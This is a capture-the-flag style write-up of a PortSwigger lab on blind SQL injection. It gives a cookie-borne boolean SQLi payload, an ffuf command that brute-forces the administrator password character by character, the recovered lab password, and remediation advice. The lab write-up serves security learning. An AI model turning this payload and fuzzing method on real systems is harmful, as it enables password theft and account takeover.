# Blind SQL injection with conditional responses - PortSwigger Lab 31

**Severity:** Medium
**Target:** https://0a9400cc041747268a03d1c0004e0088.web-security-academy.net

## Summary
The application concatenates the user input directly into the query and interpreted as SQL.


## Vulnerability Details
**Type:** Blind SQL injection
**Root Cause:** Lack of input sanitization/validation on the DB
**Endpoint:**  /

## Steps to Reproduce
1. Create a wordlist from a-z, 0-9 & A-Z; called testefuz.txt
2. Create a req.txt file to allocate the cookie header using the SQLi
3. After that, run ffuf attack-line with -mr to filter TRUE.
4. Perform position by position until position 21 returns false.

## Proof of Concept

req.txt
```bash
GET / HTTP/1.1
Host: 0a9400cc041747268a03d1c0004e0088.web-security-academy.net
Cookie: TrackingId=UlbhysnCI2s0Y0Xa' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1)='FUZZ'--; session=T0OqtktX9rjqZymrNRSDwRK3928WmUD4
```

ffuf attackline
```bash
ffuf -w /home/luweed/Documents/testefuz.txt:FUZZ \
     -request /home/luweed/Documents/req.txt \
     -request-proto https \
     -mr 'Welcome back!'
```

final req.txt (false)
```bash
GET / HTTP/1.1
Host: 0a9400cc041747268a03d1c0004e0088.web-security-academy.net
Cookie: TrackingId=UlbhysnCI2s0Y0Xa' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 21, 1)='FUZZ'--; session=T0OqtktX9rjqZymrNRSDwRK3928WmUD4
```


## Result

<br>
<img width="1910" height="993" alt="image" src="https://github.com/user-attachments/assets/c8f5ea74-0173-4ac3-9951-d014826b33dd" />

<br>
<br>
<img width="1910" height="930" alt="image" src="https://github.com/user-attachments/assets/ed58ce23-f1be-4a78-8340-952e000f8985" />

<br>
<br>

user: administrator password:qz2sh0300ncta8lxouwv


## Impact

This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
Use parameterized queries (prepared statements) to prevent user input from being interpreted as SQL. 
Avoid reflecting query results in application behavior in ways that enable boolean-based inference.
